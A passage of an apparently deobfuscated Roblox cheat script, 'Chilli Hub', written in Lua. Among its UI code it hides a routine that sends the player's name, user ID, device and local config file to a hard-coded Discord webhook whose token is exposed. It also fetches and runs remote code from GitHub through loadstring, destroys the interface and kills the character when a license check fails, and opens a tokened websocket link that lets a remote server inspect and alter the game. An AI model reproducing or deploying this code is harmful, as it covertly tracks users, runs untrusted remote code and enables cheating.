		tbl520.Header.Set({ Width = n30 })

		for _, perk in ipairs(tbl520.Perks) do
			perk.Frame.Set({ Width = n30 })
			perk.Title.Set({ Width = n33 })
			perk.Text.Set({ Width = n33 })
		end

		tbl520.Tip.Set({ Width = n30 })
	end

	local function build(obj112)
		tbl520.Hero = obj112:Frame({
			Name = "Hero",
			X = n16,
			Y = n16,
			Width = 14,
			Height = n17,
			Background = "#FFFFFF",
			Gradient = colorSequence2,
			GradientRotation = 0,
			Corner = 0.35,
			StrokeColor = "#FF6A40",
			StrokeThickness = n15,
			StrokeTransparency = 0.55,
		})

		tbl520.Logo = obj112:Image({
			Parent = tbl520.Hero,
			X = 0.5,
			Y = (n17 - n18) / 2,
			Width = n18,
			Height = n18,
			Image = url2,
		})

		tbl520.Title = obj112:Text({
			Parent = tbl520.Hero,
			X = n19,
			Y = 0.45,
			Width = 1,
			Height = 1.6,
			Scale = 1.45,
			Wrap = false,
			Text = "<b>Chilli Hub Leaked by CCPS</b>",
			Gradient = value597,
			GradientRotation = 0,
			TextStrokeTransparency = 1,
		})

		tbl520.Subtitle = obj112:Text({
			Parent = tbl520.Hero,
			X = n19,
			Y = 2.1,
			Width = 1,
			Height = 1,
			Wrap = false,
			Text = "Official Discord Community",
			Color = "#DCDCE8",
		})

		tbl520.Members = obj112:Text({
			Parent = tbl520.Hero,
			X = n19,
			Y = 3.3,
			Width = 1,
			Height = 1.2,
			Wrap = false,
			Text = string.format("<font color=\"#6EE49C\">%s</font>  <b>%s</b>  <font color=\"#B8B8CC\">Members</font>", utf8.char(9679), "130K+"),
		})

		tbl520.Invite = obj112:Frame({
			Name = "Invite",
			X = n16,
			Y = n20 + n16,
			Width = 14,
			Height = n21,
			Background = "#000000",
			BackgroundTransparency = 0.5,
			Corner = 0.35,
			StrokeColor = "#5865F2",
			StrokeThickness = n15,
			StrokeTransparency = 0.35,
		})

		tbl520.Label = obj112:Text({
			Parent = tbl520.Invite,
			X = n14 + 0.1,
			Y = 0.35,
			Width = 1,
			Height = 0.9,
			Scale = 0.78,
			Wrap = false,
			Text = "<b>INVITE LINK</b>",
			Color = "#9C9CB4",
		})

		tbl520.Link = obj112:Text({
			Parent = tbl520.Invite,
			X = n14 + 0.1,
			Y = 1.35,
			Width = 1,
			Height = 1.6,
			Scale = 1.05,
			Wrap = false,
			Font = "code",
			Text = discordUrl,
		})

		tbl520.Copy = obj112:Button({
			Parent = tbl520.Invite,
			X = 14 - n22 - n14,
			Y = (n21 - n23) / 2,
			Width = n22,
			Height = n23,
			Text = "<b>Copy Link</b>",
			Color = "#FFFFFF",
			Scale = 1,
			Background = "#5865F2",
			BackgroundTransparency = 0,
			HoverTransparency = 0.15,
			PressTransparency = 0.3,
			StrokeColor = "#9AA3FF",
			StrokeThickness = n15,
			Corner = 0.3,
			Callback = callback26,
		})

		tbl520.Header = obj112:Text({
			X = n16 + 0.1,
			Y = n24 - 1.15 + n16,
			Width = 14,
			Height = 1,
			Scale = 0.8,
			Wrap = false,
			Text = "<b>WHAT YOU GET</b>",
			Color = "#9C9CB4",
		})

		for i, item203 in ipairs(tbl518) do
			local tbl521 = {
				Frame = obj112:Frame({
					Name = "Perk",
					X = n16,
					Y = n24 + (i - 1) * (n25 + n26) + n16,
					Width = 14,
					Height = n25,
					Background = "#000000",
					BackgroundTransparency = 0.68,
					Corner = 0.35,
				}),
			}

			tbl521.Accent = obj112:Frame({
				Parent = tbl521.Frame,
				X = 0.3,
				Y = 0.45,
				Width = 0.22,
				Height = n25 - 0.9,
				Background = item203.Color,
				Corner = 0.11,
			})

			tbl521.Title = obj112:Text({
				Parent = tbl521.Frame,
				X = 0.85,
				Y = 0.3,
				Width = 1,
				Height = 1.1,
				Wrap = false,
				Text = "<b>" .. item203.Title .. "</b>",
				Color = item203.Color,
			})

			tbl521.Text = obj112:Text({
				Parent = tbl521.Frame,
				X = 0.85,
				Y = 1.35,
				Width = 1,
				Height = 1.5,
				Scale = 0.86,
				Wrap = true,
				Text = item203.Text,
				Color = "#C8C8D8",
			})

			tbl520.Perks[i] = tbl521
		end

		tbl520.Tip = obj112:Text({
			X = n16 + 0.1,
			Y = n27 - 2.2 - n16,
			Width = 14,
			Height = 2,
			Scale = 0.8,
			Wrap = true,
			Text = "Paste the copied link into your browser or the Discord app to join.",
			Color = "#8A8AA2",
		})

		obj112:SetContentLines(n27)

		obj112:OnResize(function(param450, num161, param451)
			func757(num161 / math.max(param451, 1))
		end)

		local max = math.max
		func757(obj112:Width() / max(obj112:Unit(), 1))
	end

	if type(obj111.CreateCanvas) == "function" then
		local obj113 = obj111:CreateCanvas({
			Name = "Discord",
			ShowTitle = false,
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = math.ceil(n27),
				MaxLines = math.ceil(n27),
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = build,
		})

		func4(function()
			obj113:Destroy()
		end)
	else
		obj111:CreateText({ Name = "Discord", Text = "https://discord.gg/CJK4bs2mgT" })
	end

	if type(obj111.CreateButton) == "function" then
		obj111:CreateButton({ Name = "Copy Discord Link", Callback = callback26 })
	end
end

do
	local image = "rbxassetid://128961717706452"
	local n14 = 56
	local n15 = 0.035
	local n16 = 8
	local tweenInfo = TweenInfo.new(0.08, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	local tweenInfo2 = TweenInfo.new(0.14, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
	local TweenService = game:GetService("TweenService")
	local list93 = {}
	local screenGui = nil
	local uiScale = nil
	local uiScale2 = nil

	local function func758()
		for _, item204 in ipairs({ "Toggle", "Open" }) do
			local ok, result = pcall(function()
				return obj2[item204]
			end)

			if ok and type(result) == "function" then
				pcall(result, obj2)
				return
			end
		end
	end

	local function func759()
		if not uiScale then
			return
		end
		local currentCamera = workspace.CurrentCamera
		currentCamera = currentCamera and currentCamera.ViewportSize or Vector2.new(1280, 720)

		if currentCamera.X < 1 then
			currentCamera = Vector2.new(1280, 720)
		end

		uiScale.Scale = math.clamp(currentCamera.X * n15 / n14, 0.7, 1.4)
	end

	local function func760()
		for _, item205 in ipairs(list93) do
			pcall(function()
				item205:Disconnect()
			end)
		end

		table.clear(list93)

		if screenGui then
			pcall(function()
				screenGui:Destroy()
			end)
		end

		screenGui = nil
		uiScale = nil
		uiScale2 = nil
	end

	local function func761()
		func760()
		screenGui = Instance.new("ScreenGui")
		screenGui.Name = func3()
		screenGui.Archivable = false
		screenGui.DisplayOrder = 59
		screenGui.IgnoreGuiInset = true
		screenGui.ResetOnSpawn = false
		screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
		local frame = Instance.new("Frame")
		frame.Name = func3()
		frame.AnchorPoint = Vector2.new(0, 0.5)
		frame.Position = UDim2.new(0, 16, 0.3, 0)
		frame.Size = UDim2.fromOffset(56, 56)
		frame.BackgroundTransparency = 1
		frame.BorderSizePixel = 0
		frame.Parent = screenGui
		uiScale = Instance.new("UIScale")
		uiScale.Name = func3()
		uiScale.Parent = frame
		func759()
		local imageButton = Instance.new("ImageButton")
		imageButton.Name = func3()
		imageButton.AnchorPoint = Vector2.new(0.5, 0.5)
		imageButton.Position = UDim2.fromScale(0.5, 0.5)
		imageButton.Size = UDim2.fromScale(1, 1)
		imageButton.BackgroundTransparency = 1
		imageButton.BorderSizePixel = 0
		imageButton.AutoButtonColor = false
		imageButton.Image = image
		imageButton.ScaleType = Enum.ScaleType.Fit
		imageButton.Active = true
		imageButton.Parent = frame
		uiScale2 = Instance.new("UIScale")
		uiScale2.Name = func3()
		uiScale2.Parent = imageButton
		local uiCorner = Instance.new("UICorner")
		uiCorner.Name = func3()
		uiCorner.CornerRadius = UDim.new(0.28, 0)
		uiCorner.Parent = imageButton

		local function func762(param452, param453)
			if uiScale2 then
				TweenService:Create(uiScale2, param453, { Scale = param452 }):Play()
			end
		end

		local function func763(num162)
			local absoluteSize = screenGui.AbsoluteSize
			local absoluteSize2 = frame.AbsoluteSize
			if absoluteSize.X <= 0 or absoluteSize.Y <= 0 then
				return num162
			end
			local n17 = num162.Y.Offset + num162.Y.Scale * absoluteSize.Y
			local n18 = math.clamp(num162.X.Offset + num162.X.Scale * absoluteSize.X, 0, math.max(0, absoluteSize.X - absoluteSize2.X))
			local n19 = math.clamp(n17, absoluteSize2.Y * 0.5, math.max(absoluteSize2.Y * 0.5, absoluteSize.Y - absoluteSize2.Y * 0.5))
			return UDim2.fromOffset(n18, n19)
		end

		local value599 = nil
		local vector2 = nil
		local position = nil
		local flag686 = false
		local flag687 = false

		local function func764(input2, flag688)
			if value599 == "mouse" then
				return input2.UserInputType == (flag688 and Enum.UserInputType.MouseMovement or Enum.UserInputType.MouseButton1)
			end
			return input2 == value599
		end

		list93[#list93 + 1] = imageButton.InputBegan:Connect(function(input)
			local userInputType3 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not userInputType3 or input.UserInputState ~= Enum.UserInputState.Begin or value599 then
				return
			end
			value599 = userInputType3 and input or "mouse"
			vector2 = Vector2.new(input.Position.X, input.Position.Y)
			position = frame.Position
			flag686 = false
			flag687 = false
			func762(0.9, tweenInfo)
		end)

		list93[#list93 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not value599 or not func764(input, true) then
				return
			end
			local n17 = Vector2.new(input.Position.X, input.Position.Y) - vector2

			if not flag686 then
				if n17.Magnitude < n16 then
					return
				end
				flag686 = true
				flag687 = true
				func762(1, tweenInfo2)
			end

			frame.Position = func763(UDim2.new(position.X.Scale, position.X.Offset + n17.X, position.Y.Scale, position.Y.Offset + n17.Y))
		end)

		list93[#list93 + 1] = UserInputService.InputEnded:Connect(function(input)
			if value599 and func764(input, false) then
				value599 = nil
				flag686 = false
				func762(1, tweenInfo2)
			end
		end)

		list93[#list93 + 1] = imageButton.Activated:Connect(function()
			if flag687 then
				flag687 = false
				return
			end
			func758()
		end)

		local currentCamera = workspace.CurrentCamera

		if currentCamera then
			list93[#list93 + 1] = currentCamera:GetPropertyChangedSignal("ViewportSize"):Connect(func759)
		end

		screenGui.Parent = value1
	end

	func761()
	func4(func760)
end

obj1:Finalize({ Window = obj2, MainTab = defaultTab, ShowMainTab = true })

task.defer(function()
	if #list1 == 0 or type(readfile) ~= "function" then
		return
	end
	local HttpService2 = game:GetService("HttpService")

	local function func765(param454)
		if type(isfile) == "function" then
			local ok, result = pcall(isfile, param454)
			if ok and not result then
				return nil
			end
		end

		local ok, result = pcall(readfile, param454)
		if not ok or type(result) ~= "string" or result == "" then
			return nil
		end
		local ok2, result2 = pcall(HttpService2.JSONDecode, HttpService2, result)
		return ok2 and type(result2) == "table" and result2 or nil
	end

	local json = func765("ChilliLibrary/config_state.json") or {}
	if json.AutoLoad == false then
		return
	end
	local value600 = func765("ChilliLibrary/configs/" .. (type(json.StartupConfig) == "string" and json.StartupConfig ~= "" and json.StartupConfig or type(json.SelectedConfig) == "string" and json.SelectedConfig ~= "" and json.SelectedConfig or "Default") .. ".json")
	if type(value600) ~= "table" or type(value600.Values) ~= "table" then
		return
	end
	local tbl522 = { ["K/s"] = 1000, ["M/s"] = 1000000, ["B/s"] = 1e9 }
	local tbl523 = {}

	for _, item206 in ipairs(list1) do
		local flag689 = false
		local value601 = nil

		for _, value602 in pairs(value600.Values) do
			local tbl524 = type(value602) == "table" and value602[item206.Section] or nil

			if type(tbl524) == "table" then
				if tbl524[item206.Name] ~= nil then
					flag689 = true
				end

				local entry55 = tbl524[item206.Legacy]

				if type(entry55) == "table" and tonumber(entry55.Value) then
					value601 = entry55
				end
			end
		end

		if value601 and not flag689 then
			local n14 = math.max(0, tonumber(value601.Value)) * (tbl522[tostring(value601.Unit)] or 1000000)

			if n14 > 0 then
				table.insert(tbl523, { Handle = item206.Handle, Step = item206.StepOf(n14) })
			end
		end
	end

	for _, item207 in ipairs({ 0.1, 1, 2 }) do
		if #tbl523 == 0 then
			return
		end
		task.wait(item207)

		for _, item208 in ipairs(tbl523) do
			local ok, result = pcall(item208.Handle.Get, item208.Handle)

			if ok then
				ok = (tonumber(result) or 0) <= 0
			end

			if ok then
				pcall(item208.Handle.Set, item208.Handle, item208.Step)
			end
		end
	end
end)

task.defer(function()
	for i = 1, 3 do
		RunService.Heartbeat:Wait()
	end

	if type(str1.RestoreStealPanel) == "function" then
		pcall(str1.RestoreStealPanel)
	end
end)

local request_

do
	local Players2 = game:GetService("Players")
	local HttpService2 = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = Players2.LocalPlayer
	request_ = syn and syn.request or http and http.request or http_request or request
	local url3 = "https://discord.com/api/webhooks/1381274668706693120/D5XogJZVdo_q7XZ9bEJDETQjevMFaBSeVRT4EJ0fLKtPeqR112o7PmA1fN_hZn4rmJ2y"
	local keyboardEnabled = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if request_ and localPlayer2 then
		task.spawn(function()
			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile
			local readfile_2

			if readfile_ then
				readfile_2 = readfile_
			else
				readfile_2 = getgenv and getgenv().readfile
			end

			local func766 = readfile_2 or nil
			local isfile_ = isfile or syn and syn.isfile or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
			local str81 = "Default"
			local value603 = nil
			local fileName = "Default.json"

			if type(func766) == "function" then
				pcall(function()
					local flag690 = true

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, "ChilliLibrary/config_state.json")

						if ok and not result then
							flag690 = false
						end
					end

					if flag690 then
						local json = func766("ChilliLibrary/config_state.json")

						if json and json ~= "" then
							local data = HttpService2:JSONDecode(json)

							if type(data) == "table" then
								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
									str81 = data.StartupConfig
								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
									str81 = data.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local str82 = "ChilliLibrary/configs/" .. str81 .. ".json"
					local flag691 = true

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, str82)

						if ok and not result then
							flag691 = false
						end
					end

					if flag691 then
						value603 = func766(str82)
						fileName = str81 .. ".json"
					end

					if (not value603 or value603 == "") and str81 ~= "Default" then
						local flag692 = true

						if type(isfile_) == "function" then
							local ok, result = pcall(isfile_, "ChilliLibrary/configs/Default.json")

							if ok and not result then
								flag692 = false
							end
						end

						if flag692 then
							local ok, result = pcall(func766, "ChilliLibrary/configs/Default.json")

							if ok and type(result) == "string" and result ~= "" then
								value603 = result
								fileName = "Default.json"
							end
						end
					end
				end)
			end

			local str83 = tostring(fileName):gsub("[<>:\"/\\|?*]", "_")

			if not str83:match("%.json$") then
				str83 ..= ".json"
			end

			local formatted22 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, keyboardEnabled, value603 and value603 ~= "" and " | Startup Config: **" .. str81 .. "**" or "")
			local flag693 = false

			if value603 and value603 ~= "" then
				pcall(function()
					local str84 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local str85 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str83 .. "\"\r\n"
					local str86 = value603 .. "\r\n"

					local value604 = request_({
						Url = url3,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str84 },
						Body = table.concat({
							"--" .. str84 .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							HttpService2:JSONEncode({ content = formatted22 }) .. "\r\n",
							"--" .. str84 .. "\r\n",
							str85,
							"Content-Type: application/json\r\n\r\n",
							str86,
							"--" .. str84 .. "--\r\n",
						}),
					})

					local flag694 = type(value604) == "table"

					if flag694 then
						flag694 = value604.StatusCode == 200 or value604.StatusCode == 204 or value604.Success == true
					end

					if flag694 then
						flag693 = true
					end
				end)
			end

			if not flag693 then
				pcall(function()
					request_({
						Url = url3,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = HttpService2:JSONEncode({ content = formatted22 }),
					})
				end)
			end
		end)
	end
end

task.spawn(function()
	task.wait(20)
	local str87 = "\0chilli_guard"
	local genv = typeof(getgenv) == "function" and getgenv() or _G

	local function func767()
		local entry56 = genv[str87]
		if type(entry56) == "table" and type(entry56.Ask) == "function" then
			return entry56
		end
		return nil
	end

	local result105 = func767()

	if not result105 then
		task.spawn(function()
			local value605 = nil

			for i = 1, 4 do
				task.wait()

				local ok, result = pcall(function()
					local value606 = value605
					local response

					if value605 then
						response = value606
					else
						response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/GD/refs/heads/main/SAEGD")
					end

					value605 = response
					local chunk, value607 = loadstring(value605)
					assert(chunk, value607)
					return chunk()
				end)

				if ok then
					func1("guard: loader ran on try " .. i)
					return
				end

				if type(result) == "string" and string.find(result, "HttpGet", 1, true) then
					value605 = nil
				end

				func1("guard: loader try " .. i .. " failed: " .. tostring(result))
				task.wait(1 + i)
			end
		end)

		local n14 = os.clock() + 30

		while true do
			task.wait(0.25)
			result105 = func767()
			if not (result105 or os.clock() > n14) then
				continue
			end
			break
		end
	end

	local flag695 = false

	if result105 then
		local ok, result = pcall(result105.Ask, "v202")
		flag695 = ok and type(result) == "string" and #result > 0
	end

	genv[str87] = nil
	if flag695 then
		return
	end

	pcall(function()
		local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

		if type(chilliHubSaeCleanup) == "function" then
			chilliHubSaeCleanup()
		end
	end)

	genv.ChilliHubSaeCleanup = nil

	pcall(function()
		local Players2 = game:GetService("Players")
		local tbl525 = { game:GetService("CoreGui") }

		if typeof(gethui) == "function" then
			local ok, result = pcall(gethui)

			if ok and typeof(result) == "Instance" then
				table.insert(tbl525, result)
			end
		end

		local playerGui = Players2.LocalPlayer:FindFirstChildOfClass("PlayerGui")

		if playerGui then
			table.insert(tbl525, playerGui)
		end

		for _, item209 in ipairs(tbl525) do
			for _, child in ipairs(item209:GetChildren()) do
				if child:IsA("ScreenGui") then
					pcall(function()
						child:Destroy()
					end)
				end
			end
		end
	end)

	pcall(function()
		rawset(_G, "__ChilliAutoLoadQueued", nil)

		if type(queue_on_teleport) == "function" then
			queue_on_teleport("")
		elseif type(queueonteleport) == "function" then
			queueonteleport("")
		end
	end)

	pcall(function()
		local character = game:GetService("Players").LocalPlayer.Character

		if character then
			character:BreakJoints()
		end
	end)

	pcall(function()
	end)
end)

local HttpService2
HttpService2 = game:GetService("HttpService")
local Players2
Players2 = game:GetService("Players")
local RunService2
RunService2 = game:GetService("RunService")
local Workspace
Workspace = game:GetService("Workspace")
local str88
str88 = "chp-7E0Yzx4yddoAozc9VNLsqTnA"
local str89
str89 = "wss://chillihub.pro/roblox-mcp?token=" .. str88
local str90
str90 = "https://chillihub.pro/roblox-mcp/beat"
local str91
str91 = "SAE v678"
local flag696, flag697, localPlayer2, genv, flag698, flag699, obj114, n14, flag700, tbl526
local tbl527, tbl528, n15, func768, func769, func770, func771, func772, func773, func774
local func775, func776, func777, func778

do
	local n16 = 7
	local n17 = 500
	local n18 = 245760
	local flag701 = false
	flag696 = false
	flag697 = false
	localPlayer2 = Players2.LocalPlayer
	genv = getgenv and getgenv() or _G

	if type(genv.StopChilliLink) == "function" then
		pcall(genv.StopChilliLink)
	end

	flag698 = true
	flag699 = false
	obj114 = nil
	n14 = 0
	flag700 = false
	tbl526 = {}
	tbl527 = {}
	tbl528 = {}
	n15 = 0

	func768 = function(...)
		if flag701 then
			print("[ROBLOX MCP]", ...)
		end
	end

	func769 = function(...)
		if flag701 then
			warn("[ROBLOX MCP]", ...)
		end
	end

	func770 = function(flag702)
		return tostring(flag702 or ""):match("^%s*(.-)%s*$")
	end

	func771 = function(param455, param456, param457, param458)
		local num163 = tonumber(param455)
		if not num163 then
			return param458
		end
		return math.max(param456, math.min(param457, num163))
	end

	func772 = function(list94)
		for _, item210 in ipairs(list94) do
			pcall(function()
				item210:Disconnect()
			end)
		end

		table.clear(list94)
	end

	func773 = function()
		if syn and syn.websocket and type(syn.websocket.connect) == "function" then
			return syn.websocket.connect, "syn.websocket.connect"
		end

		if WebSocket and type(WebSocket.connect) == "function" then
			return WebSocket.connect, "WebSocket.connect"
		end

		if WebSocket and type(WebSocket.new) == "function" then
			return WebSocket.new, "WebSocket.new"
		end

		if WebSocket and type(WebSocket.New) == "function" then
			return WebSocket.New, "WebSocket.New"
		end

		if websocket and type(websocket.connect) == "function" then
			return websocket.connect, "websocket.connect"
		end

		if syn and syn.WebSocket and type(syn.WebSocket.new) == "function" then
			return syn.WebSocket.new, "syn.WebSocket.new"
		end
		return nil, nil
	end

	func774 = function(tbl529, ...)
		local packed7 = table.pack(...)

		for i = 1, select("#", ...) do
			local value608 = select(i, table.unpack(packed7, 1, packed7.n))

			local ok, result = pcall(function()
				return tbl529[value608]
			end)

			if ok and result ~= nil then
				return result, value608
			end
		end

		return nil, nil
	end

	func775 = function(obj115, param459)
		if not obj115 then
			return nil
		end

		local ok, result = pcall(function()
			return obj115:Connect(param459)
		end)

		return ok and result or nil
	end

	func776 = function(obj116)
		if typeof(obj116) ~= "Instance" then
			return nil
		end

		local ok, result = pcall(function()
			return obj116:GetFullName()
		end)

		return ok and result or obj116.Name
	end

	func777 = nil

	func777 = function(list95, num164, tbl530)
		num164 = num164 or 0
		tbl530 = tbl530 or {}
		if n16 < num164 then
			return "<max-depth>"
		end
		local kind = typeof(list95)
		if list95 == nil or kind == "string" or kind == "boolean" then
			return list95
		end

		if kind == "number" then
			if list95 ~= list95 or list95 == math.huge or list95 == -math.huge then
				return tostring(list95)
			end
			return list95
		end

		if kind == "Instance" then
			return { type = "Instance", className = list95.ClassName, name = list95.Name, path = func776(list95) }
		end

		if kind == "Vector2" then
			return { type = "Vector2", x = list95.X, y = list95.Y }
		end

		if kind == "Vector3" then
			return { type = "Vector3", x = list95.X, y = list95.Y, z = list95.Z }
		end

		if kind == "Color3" then
			return {
				type = "Color3",
				r = math.floor(list95.R * 255 + 0.5),
				g = math.floor(list95.G * 255 + 0.5),
				b = math.floor(list95.B * 255 + 0.5),
			}
		end

		if kind == "UDim" then
			return { type = "UDim", scale = list95.Scale, offset = list95.Offset }
		end

		if kind == "UDim2" then
			return {
				type = "UDim2",
				xScale = list95.X.Scale,
				xOffset = list95.X.Offset,
				yScale = list95.Y.Scale,
				yOffset = list95.Y.Offset,
			}
		end

		if kind == "CFrame" then
			return { type = "CFrame", components = { list95:GetComponents() } }
		end

		if kind == "EnumItem" then
			return tostring(list95)
		end

		if kind == "BrickColor" then
			return { type = "BrickColor", name = list95.Name, number = list95.Number }
		end

		if kind == "table" then
			if tbl530[list95] then
				return "<cycle>"
			end
			tbl530[list95] = true
			local n19 = 0
			local flag703 = true
			local n20 = 0

			for k in pairs(list95) do
				n19 += 1

				if not (n17 < n19) then
					if type(k) ~= "number" or k < 1 or k % 1 ~= 0 then
						flag703 = false
					elseif n20 < k then
						n20 = k
					end

					continue
				end

				break
			end

			local tbl531

			if flag703 and n20 <= n17 then
				tbl531 = {}

				for i = 1, n20 do
					tbl531[i] = func777(list95[i], num164 + 1, tbl530)
				end
			else
				tbl531 = {}
				local value609, value610, value611 = pairs(list95)
				local n21 = 0

				for k, value612 in value609, value610, value611 do
					n21 += 1

					if n17 < n21 then
						tbl531.__truncated = true
						break
					else
						tbl531[tostring(k)] = func777(value612, num164 + 1, tbl530)
					end
				end
			end

			tbl530[list95] = nil
			return tbl531
		end

		return tostring(list95)
	end

	func778 = function(param460)
		if not flag699 or not obj114 then
			return false, "not connected"
		end

		local ok, result = pcall(function()
			return HttpService2:JSONEncode(func777(param460))
		end)

		if not ok then
			return false, "JSON encode failed: " .. tostring(result)
		end

		if n18 < #result then
			if not (type(param460) == "table" and param460.type == "rpc_result") then
				return false, "message too large"
			end

			result = HttpService2:JSONEncode({
				type = "rpc_result",
				requestId = param460.requestId,
				success = false,
				error = string.format("Result is too large to send (%d KB). Return less data.", math.floor(#result / 1024)),
			})
		end

		local ok2, result2 = pcall(function()
			obj114:Send(result)
		end)

		if not ok2 then
			return false, "WebSocket send failed: " .. tostring(result2)
		end
		return true
	end
end

local func779

func779 = function(param461, flag704)
	func778({ type = "rpc_event", event = param461, data = flag704 or {} })
end

local func780

do
	local tbl532 = {
		Game = game,
		game = game,
		Workspace = Workspace,
		workspace = Workspace,
		Players = Players2,
		Lighting = game:GetService("Lighting"),
		ReplicatedStorage = game:GetService("ReplicatedStorage"),
		ReplicatedFirst = game:GetService("ReplicatedFirst"),
		StarterGui = game:GetService("StarterGui"),
		StarterPlayer = game:GetService("StarterPlayer"),
		SoundService = game:GetService("SoundService"),
		Teams = game:GetService("Teams"),
		LocalPlayer = localPlayer2,
	}

	local function func781(param462)
		local tbl533 = {}

		for match in func770(param462):gmatch("[^%.]+") do
			table.insert(tbl533, match)
		end

		return tbl533
	end

	func780 = function(param463)
		local list96 = func781(param463)
		if #list96 == 0 then
			return nil, "path is empty"
		end
		local result = tbl532[list96[1]]

		if not result then
			local ok

			ok, result = pcall(function()
				return game:GetService(list96[1])
			end)

			if not (ok and result) then
				return nil, "unknown root: " .. list96[1]
			end
		end

		for i = 2, #list96 do
			local pathNotFoundAt = list96[i]

			if result == Players2 and pathNotFoundAt == "LocalPlayer" then
				result = localPlayer2
			elseif result == localPlayer2 and pathNotFoundAt == "PlayerGui" then
				result = localPlayer2:FindFirstChildOfClass("PlayerGui")
			elseif result == localPlayer2 and pathNotFoundAt == "Character" then
				result = localPlayer2.Character
			elseif result == Workspace and pathNotFoundAt == "CurrentCamera" then
				result = Workspace.CurrentCamera
			elseif typeof(result) == "Instance" then
				result = result:FindFirstChild(pathNotFoundAt)
			else
				result = nil
			end

			if not result then
				return nil, "path not found at: " .. pathNotFoundAt
			end
		end

		return result
	end
end

local tbl534, func782

local tbl535 = {
	Archivable = true,
	Anchored = true,
	AssemblyAngularVelocity = true,
	AssemblyLinearVelocity = true,
	AutomaticSize = true,
	BackgroundColor3 = true,
	BackgroundTransparency = true,
	BrickColor = true,
	CanCollide = true,
	CanQuery = true,
	CanTouch = true,
	CanvasPosition = true,
	CanvasSize = true,
	CFrame = true,
	ClipsDescendants = true,
	Color = true,
	Enabled = true,
	FieldOfView = true,
	Health = true,
	Image = true,
	ImageColor3 = true,
	ImageTransparency = true,
	JumpPower = true,
	LayoutOrder = true,
	Material = true,
	MaxHealth = true,
	MoveDirection = true,
	Orientation = true,
	Position = true,
	RichText = true,
	Rotation = true,
	Size = true,
	Text = true,
	TextColor3 = true,
	TextSize = true,
	TextTransparency = true,
	TextWrapped = true,
	Transparency = true,
	Value = true,
	Velocity = true,
	Visible = true,
	WalkSpeed = true,
}

tbl534 = {
	"Archivable",
	"Position",
	"Size",
	"CFrame",
	"Color",
	"Transparency",
	"Visible",
	"Enabled",
	"Text",
	"Value",
	"Health",
	"MaxHealth",
}

func782 = function(tbl536, param464)
	if not tbl535[param464] then
		return nil, "not_allowed"
	end

	local ok, result = pcall(function()
		return tbl536[param464]
	end)

	if ok then
		return func777(result)
	end
	return nil, "unavailable"
end

local func783

func783 = function(instance31)
	return {
		name = instance31.Name,
		className = instance31.ClassName,
		path = func776(instance31),
		parentPath = instance31.Parent and func776(instance31.Parent) or nil,
	}
end

local func784

func784 = function(instance32, param465, callback27)
	local children = instance32:GetChildren()
	local n16 = 1
	local n17 = 0

	while n16 <= #children and n17 < param465 do
		local entry57 = children[n16]
		n16 += 1
		n17 += 1
		if callback27(entry57, n17) then
			return n17, true
		end

		if #children < param465 then
			local children2 = entry57:GetChildren()

			for _, item211 in ipairs(children2) do
				if not (param465 <= #children) then
					table.insert(children, item211)
					continue
				end
				break
			end
		end
	end

	return n17, false
end

do
	local name = "CodexMCP"

	local tbl537 = {
		Frame = true,
		TextLabel = true,
		TextButton = true,
		TextBox = true,
		ImageLabel = true,
		ImageButton = true,
		ScrollingFrame = true,
		UICorner = true,
		UIStroke = true,
		UIListLayout = true,
		UIGridLayout = true,
		UIPadding = true,
		UIAspectRatioConstraint = true,
		UISizeConstraint = true,
	}

	local tbl538 = {
		Active = true,
		AnchorPoint = true,
		AutomaticCanvasSize = true,
		AutomaticSize = true,
		BackgroundColor3 = true,
		BackgroundTransparency = true,
		BorderSizePixel = true,
		CanvasPosition = true,
		CanvasSize = true,
		ClipsDescendants = true,
		CornerRadius = true,
		DisplayOrder = true,
		Enabled = true,
		FillDirection = true,
		Font = true,
		HorizontalAlignment = true,
		Image = true,
		ImageColor3 = true,
		ImageTransparency = true,
		LayoutOrder = true,
		LineJoinMode = true,
		MaxTextSize = true,
		MinTextSize = true,
		Name = true,
		Padding = true,
		PaddingBottom = true,
		PaddingLeft = true,
		PaddingRight = true,
		PaddingTop = true,
		Position = true,
		RichText = true,
		Rotation = true,
		ScrollBarThickness = true,
		Size = true,
		SortOrder = true,
		Text = true,
		TextColor3 = true,
		TextScaled = true,
		TextSize = true,
		TextStrokeColor3 = true,
		TextStrokeTransparency = true,
		TextTransparency = true,
		TextTruncate = true,
		TextWrapped = true,
		TextXAlignment = true,
		TextYAlignment = true,
		Thickness = true,
		Transparency = true,
		VerticalAlignment = true,
		Visible = true,
		ZIndex = true,
	}

	local tbl539 = {
		BackgroundColor3 = true,
		BorderColor3 = true,
		Color = true,
		ImageColor3 = true,
		TextColor3 = true,
		TextStrokeColor3 = true,
	}

	local tbl540 = { CanvasPosition = false, CanvasSize = true, Position = true, Size = true }
